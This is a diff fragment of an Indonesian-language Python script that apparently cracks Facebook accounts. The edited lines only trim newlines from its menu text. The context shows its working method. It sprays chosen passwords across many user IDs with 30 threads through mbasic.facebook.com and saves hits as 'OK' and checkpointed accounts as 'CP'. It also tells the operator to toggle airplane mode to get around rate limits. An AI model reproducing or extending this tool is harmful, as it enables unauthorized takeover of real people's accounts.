@@ -623,11 +623,11 @@ def sandimanual():
 	elif len(pwek)<=5:
 		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mmasukan sandi minimal 6 angka\x1b[1;97m!"%(M))
         print('%s \x1b[1;92m║'%(O))
-	print(" \x1b[1;92m[ \x1b[1;93mpilih method version - silahkan coba satu² \x1b[1;92m]\n")
+	print(" \x1b[1;92m[ \x1b[1;93mpilih method version - silahkan coba satu² \x1b[1;92m]")
 	print(" \x1b[1;92m╠══[\x1b[1;93m01\x1b[1;92m] \x1b[1;93mmethod API \x1b[1;92m(\x1b[1;93mfast\x1b[1;92m)")
 	print(" \x1b[1;92m╠══[\x1b[1;93m02\x1b[1;92m] \x1b[1;93mmethod mbasic \x1b[1;92m(\x1b[1;93mslow\x1b[1;92m)")
 	print(" \x1b[1;92m╠══[\x1b[1;93m03\x1b[1;92m] \x1b[1;93mmethod mobile \x1b[1;92m(\x1b[1;93msuper slow\x1b[1;92m)")
-	ask=raw_input("\n \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: \x1b[1;92m")
+	ask=raw_input(" \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: \x1b[1;92m")
 	if ask=="":
 		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
 	elif ask=="1":
@@ -645,12 +645,12 @@ def sandimanual():
                 print('%s \x1b[1;92m║'%(O))
 		print(' \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
 		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
-		print('\n \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
+		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
 				uid, name = user.split("<=>")
 				fall.submit(mfbasic, uid, pwek.split(","),"https://mbasic.facebook.com")
-		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
+		exit(" \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
 	elif ask=="3":
                 print('%s \x1b[1;92m║'%(O))
 		print(' \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
@@ -665,7 +665,7 @@ def sandimanual():
 	
 def sandiotomatis():
         print('%s \x1b[1;92m║'%(O))
-	print(" \x1b[1;92m╠══[ \x1b[1;93mpilih method version - silahkan coba satu² \x1b[1;92m]\n")
+	print(" \x1b[1;92m╠══[ \x1b[1;93mpilih method version - silahkan coba satu² \x1b[1;92m]")
 	print(" \x1b[1;92m╠══[\x1b[1;93m01\x1b[1;92m] \x1b[1;93mmethod API \x1b[1;92m(\x1b[1;93mfast\x1b[1;92m)")
 	print(" \x1b[1;92m╠══[\x1b[1;93m02\x1b[1;92m] \x1b[1;93mmethod mbasic \x1b[1;92m(\x1b[1;93mslow\x1b[1;92m)")
 	print(" \x1b[1;92m╠══[\x1b[1;93m03\x1b[1;92m] \x1b[1;93mmethod mobile \x1b[1;92m(\x1b[1;93msuper slow\x1b[1;92m)")
